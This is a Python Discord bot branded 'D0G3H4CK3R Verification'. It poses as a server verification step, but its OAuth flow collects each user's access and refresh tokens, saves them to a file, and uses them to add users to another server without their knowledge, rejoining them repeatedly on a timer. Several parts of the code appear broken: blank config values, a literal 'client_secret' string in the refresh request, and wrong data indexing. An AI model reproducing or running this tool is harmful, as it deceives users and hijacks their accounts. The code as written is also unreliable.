from flask import Flask, request, redirect
import discord, asyncio, requests, datetime, json, threading
from discord.ext import commands

token = "" #BOTトークン
client_id =  #BOTのクライアントID
client_secret = "" #BOTのクライアントシークレット
url = "" #URL Generatorでidentifyとguilds.joinを指定して作られたURLを貼る
role_id =  #認証後の付与するロールのID
guild_id =  #認証する場所のサーバーID
join_guild_id_1 =  #新しく入らされるサーバーのID1
# join_guild_id_2 =  #新しく入らされるサーバーのID2
redirect_uri = "" #これはアカウントにアクセス与えた後の転送先 Pyをホストしているやつに向かせる Discord Dev Redirectで http://DomainOrIP:指定したPort/after に設定する
redirect_to = "http://ezz.gg/verify_success/" #redirect_uriのあと「認証成功したよ」とか表示させればいいページ
site_port = 8080 #リクエスト結果表示ページのポート(Disord Devのリダイレクトに設定したポート)
embed_color = 0xC27C0E #埋め込みのカラー https://www.htmlcsscolor.com/ からRGBを入力し http://ezz.gg/wp-content/uploads/iro.png のようにColor Infoのすぐ下に"#FF0000 (or 0xFF0000)"があるから(orの右の文字列をここに書く
embed_title = "D0G3H4CK3R Verification" #埋め込みのタイトル
embed_image_url = "http://ezz.gg/wp-content/uploads/d0g3h4ck3r-Verification.gif" #埋め込みする画像orGif
embed_description = "下のボタンを押して認証を完了してください" #埋め込みの説明
button_name = "✅Verify" #認証ボタンの名前
bot_prefix = "pv!"

userdata = json.loads(open("data.json", 'r').read())
app = Flask(__name__)
bot = commands.Bot(command_prefix=bot_prefix, intents=discord.Intents.all())

@app.route("/after")
def after():
    code = request.args.get('code')
    data = requests.post("https://discordapp.com/api/oauth2/token",data={"client_id":client_id,"client_secret":client_secret,"redirect_uri":redirect_uri,"code":code,"grant_type":"authorization_code"},headers={"content-type":"application/x-www-form-urlencoded"}).json()
    user = requests.get("https://discordapp.com/api/users/@me", headers={"Authorization":"Bearer {}".format(data["access_token"])}).json()
    userdata["data"][str(user['id'])] = data
    open("data.json", 'w').write(json.dumps(userdata))
    print(requests.put("https://discord.com/api/v9/guilds/{}/members/{}".format(join_guild_id_1, user["id"]),headers={"Content-Type": "application/json", "Authorization": f"Bot {token}"},json={"access_token": data["access_token"]}))
    # print(requests.put("https://discord.com/api/v9/guilds/{}/members/{}".format(join_guild_id_2, user["id"]),headers={"Content-Type": "application/json", "Authorization": f"Bot {token}"},json={"access_token": data["access_token"]}))
    result = requests.put("https://discord.com/api/v9/guilds/{}/members/{}/roles/{}".format(guild_id, user["id"], role_id), headers={"authorization":f"Bot {token}"})
    dmid = requests.post("https://discord.com/api/users/@me/channels",headers={"Authorization":"Bot "+token},json={"recipient_id":user["id"]}).json()["id"]
    requests.post("https://discord.com/api/channels/"+dmid+"/messages",headers={"Authorization":"Bot "+token},json={"content": "","embeds": [{"title": "認証されました"}]})
    if result.status_code == 204 or result.status_code == 201:
        return redirect(redirect_to)
    else:
        return "Failed"

@bot.command(name="verify-panel")
async def create_verify(ctx):
        if ctx.author.guild_permissions.administrator:
            embed=discord.Embed(title=embed_title, description=embed_description, color=embed_color)
            embed.set_image(url=embed_image_url)
            view = discord.ui.View()
            view.add_item(discord.ui.Button(label=button_name, style=discord.ButtonStyle.link, url=url))
            await ctx.send(embed=embed, view=view)

def update():
    for user in userdata["data"]:
        payload = {"client_id":client_id,"client_secret":"client_secret","grant_type":"refresh_token","refresh_token":user["refresh_token"]}
        userdata["data"][user] = requests.post("https://discordapp.com/api/oauth2/token", data=payload, headers={"Content-Type":"application/x-www-form-urlencoded"}).json()
def join_guild():
    for user in list(userdata["data"]):
        result = requests.put("https://discord.com/api/v9/guilds/{}/members/{}".format(join_guild_id_1, user), headers={"Content-Type":"application/json","Authorization":f"Bot {token}"}, json={"access_token":userdata["data"][user]["access_token"]})
        # result = requests.put("https://discord.com/api/v9/guilds/{}/members/{}".format(join_guild_id_2, user), headers={"Content-Type":"application/json","Authorization":f"Bot {token}"}, json={"access_token":userdata["data"][user]["access_token"]})
        print(result)
        if result.status_code == 204 or result.status_code == 201 or result.status_code == 403:
            del userdata["data"][user]

@bot.event
async def on_ready():
    threading.Thread(target=app.run, args=["0.0.0.0", site_port], daemon=True).start()
    if datetime.datetime.now().timestamp() - userdata["last_update"] >= 250000:
        userdata["last_update"] = datetime.datetime.now().timestamp()
        update()
        open("data.json",'w').write(json.dumps(userdata))
    join_guild()
    while True:
        await asyncio.sleep(3600)
        if datetime.datetime.now().timestamp() - userdata["last_update"] >= 250000:
            userdata["last_update"] = datetime.datetime.now().timestamp()
            update()
            open("data.json", 'w').write(json.dumps(userdata))
        join_guild()
        open("data.json", 'w').write(json.dumps(userdata))
        print("Looped")

bot.run(token)
